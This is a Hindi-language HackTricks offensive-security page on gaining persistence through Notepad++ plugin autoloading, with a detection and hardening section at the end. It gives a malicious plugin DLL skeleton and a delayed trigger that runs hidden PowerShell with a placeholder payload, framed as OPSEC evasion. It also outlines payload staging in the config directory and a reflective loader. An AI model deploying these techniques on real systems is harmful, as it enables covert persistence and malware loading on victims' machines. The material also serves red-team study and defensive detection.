# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ लॉन्च होने पर अपने `plugins` सबफ़ोल्डर में मिली हर plugin DLL को **अपने आप लोड करता है**। किसी भी **writable Notepad++ installation** में malicious plugin डालने से हर बार editor शुरू होने पर `notepad++.exe` के अंदर code execution मिलता है। इसका दुरुपयोग **persistence**, stealthy **initial execution** या editor को elevated अवस्था में लॉन्च किए जाने पर **in-process loader** के रूप में किया जा सकता है।<sup>[[1]](#references)</sup>

**Notepad++ 7.6+** से manual installation के लिए अपेक्षित layout **हर plugin के लिए एक subfolder** है (`plugins\<PluginName>\<PluginName>.dll`)। **Portable mode** में (`notepad++.exe` के साथ `doLocalConf.xml` मौजूद होने पर), पूरा application tree उसी directory में रहता है। इस वजह से कॉपी किए गए/admin tool bundles अक्सर user-writable execution surface बन जाते हैं।<sup>[[2]](#references)</sup>

## Writable plugin locations

- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (आमतौर पर लिखने के लिए admin अधिकार चाहिए)।<sup>[[1]](#references)</sup>
- कम अधिकार वाले operators के लिए writable विकल्प:<sup>[[1]](#references)</sup>
  - User-writable folder में **portable Notepad++ build** का उपयोग करें।
  - `C:\Program Files\Notepad++` को user-controlled path (जैसे `%LOCALAPPDATA%\npp\`) पर copy करें और वहीं से `notepad++.exe` चलाएँ।
  - ऐसे **admin tool bundles**, extracted zip copies या help-desk toolkits खोजें जिनमें पहले से `doLocalConf.xml` मौजूद हो और जो `Program Files` के बाहर हों।
- हर plugin को `plugins` के अंदर अपना subfolder मिलता है और startup पर वह अपने आप लोड हो जाता है; menu entries **Plugins** के अंतर्गत दिखाई देती हैं।<sup>[[2]](#references)</sup>

त्वरित जाँच:

```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```

## Plugin load points (execution primitives)
Notepad++ कुछ खास **exported functions** की अपेक्षा करता है। ये सभी initialization के दौरान call होते हैं, जिससे execution के कई surfaces मिलते हैं:<sup>[[1]](#references)</sup>
- **`DllMain`** — DLL load होते ही तुरंत चलता है (पहला execution point)।
- **`setInfo(NppData)`** — Notepad++ handles देने के लिए load पर एक बार call होता है; menu items register करने की सामान्य जगह।
- **`getName()`** — menu में दिखाया जाने वाला plugin name लौटाता है।
- **`getFuncsArray(int *nbF)`** — menu commands लौटाता है; खाली होने पर भी startup के दौरान call होता है।
- **`beNotified(SCNotification*)`** — Notepad++ / Scintilla events प्राप्त करता है (किसी user action या editor event तक payloads को defer करने के लिए उपयोगी)।
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, बड़े data exchanges के लिए उपयोगी।
- **`isUnicode()`** — load के समय check किया जाने वाला compatibility flag।

अधिकांश exports को **stubs** के रूप में implement किया जा सकता है; autoload के दौरान `DllMain` या ऊपर दिए गए किसी भी callback से execution हो सकता है।

## Minimal malicious plugin skeleton
अपेक्षित exports के साथ एक DLL compile करें और उसे किसी writable Notepad++ folder के अंतर्गत `plugins\\MyNewPlugin\\MyNewPlugin.dll` में रखें:<sup>[[1]](#references)</sup>

```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```

1. DLL build करें (Visual Studio/MinGW)।
2. `plugins` के अंदर plugin subfolder बनाएं और DLL उसमें रखें।
3. Notepad++ को restart करें; DLL अपने-आप load हो जाता है और `DllMain` तथा उसके बाद के callbacks execute करता है।

## `beNotified` के ज़रिए low-noise trigger pattern
OPSEC के लिए, कई payloads को `DllMain` से execute **नहीं** होना चाहिए। एक अधिक शांत pattern यह है कि plugin को बिना किसी समस्या के load होने दें, फिर केवल किसी वास्तविक editor event के बाद execute करें, जैसे **startup complete**, **buffer activation**, या **पहला character टाइप किया जाना**।

```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
  if (fired) return;
  if (n->nmhdr.code == NPPN_READY ||
      n->nmhdr.code == NPPN_BUFFERACTIVATED ||
      n->nmhdr.code == SCN_CHARADDED) {
    fired = true;
    WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
  }
}
```

यह noisy `DllMain` beacon की तुलना में सार्वजनिक offensive research से बेहतर मेल खाता है: DLL अब भी startup पर autoload होती है, लेकिन malicious action तब तक टाला जाता है जब तक Notepad++ का वास्तव में उपयोग होता हुआ न लगे।

## plugin config directory को secondary storage के रूप में इस्तेमाल करना
Notepad++ `NPPM_GETPLUGINSCONFIGDIR` उपलब्ध कराता है, जो **वर्तमान user की plugin configuration directory** लौटाता है।<sup>[[3]](#references)</sup> कोई malicious plugin इसका उपयोग disk पर DLL को minimal रखते हुए encrypted config, staged payloads या tasking files को ऐसे path में रखने के लिए कर सकता है जो सामान्य plugin state का हिस्सा लगे।

```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```

Operational रूप से यह तब उपयोगी है, जब आपको चाहिए:
- एक छोटा autoloaded bootstrap DLL;
- मुख्य plugin binary को दोबारा छुए बिना per-user tasking;
- **autoload trigger** को अधिक भारी second stage से अलग रखना।

## Reflective loader plugin pattern
एक weaponized plugin, Notepad++ को **reflective DLL loader** में बदल सकता है:<sup>[[1]](#references)</sup>
- एक न्यूनतम UI/menu entry (जैसे, "LoadDLL") दिखाएँ।
- payload DLL fetch करने के लिए **file path** या **URL** स्वीकार करें।
- DLL को current process में reflectively map करें और एक exported entry point (जैसे, fetch की गई DLL के अंदर loader function) invoke करें।
- लाभ: नया loader spawn करने के बजाय benign-looking GUI process का पुनः उपयोग; payload को `notepad++.exe` की integrity (elevated contexts सहित) मिलती है।
- समझौते: disk पर **unsigned plugin DLL** डालना आसानी से दिख जाता है; एक व्यावहारिक विकल्प है कि autoloaded plugin को केवल stub के रूप में इस्तेमाल करें और असली implant को कहीं और encrypted/staged रखें।

## Detection और hardening संबंधी नोट्स
- Notepad++ plugin directories में **writes** को block या monitor करें (user profiles में मौजूद portable copies सहित); controlled folder access या application allowlisting सक्षम करें।
- `plugins` के अंतर्गत **नई unsigned DLLs**, portable Notepad++ trees में बदलाव और `notepad++.exe` से होने वाली असामान्य **child processes/network activity** पर alert करें।
- वैध plugins का baseline बनाएँ और ऐसी किसी भी नई DLL की जाँच करें जो सामान्य Notepad++ plugin interface export करती हो, लेकिन shells, PowerShell या network beacons भी spawn करती हो।
- Plugin installation को केवल **Plugins Admin** के ज़रिए लागू करें और untrusted paths से portable copies के execution को प्रतिबंधित करें।

## References

- [1] [TrustedSec - Notepad++ Plugins: Plug और Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ उपयोगकर्ता पुस्तिका - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ उपयोगकर्ता पुस्तिका - Plugin संचार](https://npp-user-manual.org/docs/plugin-communication/)
{{#include ../../banners/hacktricks-training.md}}
